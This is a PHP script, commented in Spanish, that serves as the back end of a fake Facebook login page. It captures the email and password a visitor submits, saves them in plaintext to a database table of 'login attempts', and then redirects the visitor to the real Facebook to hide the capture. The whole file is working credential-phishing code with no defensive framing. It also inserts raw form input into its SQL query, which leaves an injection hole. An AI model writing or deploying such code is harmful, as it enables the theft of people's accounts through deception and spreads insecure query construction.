<?php
// Conexión con la base de datos
$conexion = new mysqli("localhost", "root", "", "facebook_clone");

// Verificamos si hay error de conexión
if ($conexion->connect_error) {
    die("Conexión fallida: " . $conexion->connect_error);
}

// Recibir los datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Insertar en la tabla intentos_login
$sql = "INSERT INTO intentos_login (email, password) VALUES ('$email', '$password')";

if ($conexion->query($sql) === TRUE) {
    // Redireccionar opcionalmente a Facebook real
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo "Error al guardar los datos: " . $conexion->error;
}

// Cerrar la conexión
$conexion->close();
?>
